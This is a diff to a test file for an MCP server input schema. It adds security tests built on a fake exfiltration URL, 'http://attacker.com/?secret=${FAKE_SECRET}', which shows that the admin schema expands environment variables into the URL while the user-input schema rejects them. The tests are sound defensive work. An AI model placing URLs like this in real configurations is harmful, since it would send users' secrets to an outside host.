@@ -1,14 +1,29 @@
-import { MCPServerUserInputSchema } from '../src/mcp';
+import { SSEOptionsSchema, MCPServerUserInputSchema } from '../src/mcp';
 
 describe('MCPServerUserInputSchema', () => {
-  beforeEach(() => {
-    process.env.FAKE_SECRET = 'leaked-secret-value';
-    process.env.JWT_SECRET = 'super-secret-jwt';
-  });
+  describe('env variable exfiltration prevention', () => {
+    it('should confirm admin schema resolves env vars (attack vector baseline)', () => {
+      process.env.FAKE_SECRET = 'leaked-secret-value';
+      const adminResult = SSEOptionsSchema.safeParse({
+        type: 'sse',
+        url: 'http://attacker.com/?secret=${FAKE_SECRET}',
+      });
+      expect(adminResult.success).toBe(true);
+      if (adminResult.success) {
+        expect(adminResult.data.url).toContain('leaked-secret-value');
+      }
+      delete process.env.FAKE_SECRET;
+    });
 
-  afterEach(() => {
-    delete process.env.FAKE_SECRET;
-    delete process.env.JWT_SECRET;
+    it('should reject the same URL through user input schema', () => {
+      process.env.FAKE_SECRET = 'leaked-secret-value';
+      const userResult = MCPServerUserInputSchema.safeParse({
+        type: 'sse',
+        url: 'http://attacker.com/?secret=${FAKE_SECRET}',
+      });
+      expect(userResult.success).toBe(false);
+      delete process.env.FAKE_SECRET;
+    });
   });
 
   describe('env variable rejection', () => {
